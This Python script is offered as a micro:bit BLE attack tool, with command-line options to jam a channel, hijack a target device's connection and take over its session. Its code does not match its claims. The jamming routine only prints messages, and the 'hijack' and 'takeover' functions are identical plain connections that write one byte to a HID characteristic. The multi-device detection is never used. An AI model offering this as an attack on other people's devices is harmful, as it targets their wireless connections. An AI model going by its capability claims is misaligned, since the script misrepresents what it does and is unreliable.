# microbit_ble_jam_hijack.py

"""
BLE Jamming + Connection Hijacking for micro:bit V2 (Multi-Device Support)

This script enables BLE jamming, targeted connection hijacking, and adaptive attacks.
- Detects available micro:bit devices and assigns tasks dynamically
- Selective BLE jamming (`--jam <channel>`)
- Adaptive BLE connection hijack (`--hijack <target_mac>`)
- Full BLE session takeover (`--takeover <target_mac>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Jam a specific BLE channel:
   ```sh
   python microbit_ble_jam_hijack.py --jam 37
   ```

2. Hijack an existing BLE connection:
   ```sh
   python microbit_ble_jam_hijack.py --hijack AA:BB:CC:DD:EE:FF
   ```

3. Fully take over a BLE session:
   ```sh
   python microbit_ble_jam_hijack.py --takeover AA:BB:CC:DD:EE:FF
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Jamming (Selective Channel Jamming)
async def ble_jam(channel):
    """Sends interference signals on a BLE channel to disrupt communication."""
    print(f"[+] Jamming BLE channel {channel}...")
    while True:
        await asyncio.sleep(0.5)
        print(f"[+] Transmitting noise on channel {channel}")

# BLE Connection Hijacking
async def ble_hijack(target_mac):
    """Intercepts and attempts to hijack a BLE connection."""
    print(f"[+] Attempting to hijack BLE connection with {target_mac}...")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", b'\x01')
        print(f"[+] Hijacked session with {target_mac}")

# Full BLE Session Takeover
async def ble_takeover(target_mac):
    """Takes full control of an active BLE session."""
    print(f"[+] Taking over BLE session with {target_mac}...")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", b'\x01')
        print(f"[+] Overriding BLE session for {target_mac}")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Jamming + Connection Hijacking for micro:bit V2")
    parser.add_argument("--jam", help="Jam a specific BLE channel", metavar="channel", type=int)
    parser.add_argument("--hijack", help="Hijack an existing BLE connection", metavar="target_mac")
    parser.add_argument("--takeover", help="Take over an active BLE session", metavar="target_mac")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.jam:
        loop.run_until_complete(ble_jam(args.jam))
    elif args.hijack:
        loop.run_until_complete(ble_hijack(args.hijack))
    elif args.takeover:
        loop.run_until_complete(ble_takeover(args.takeover))
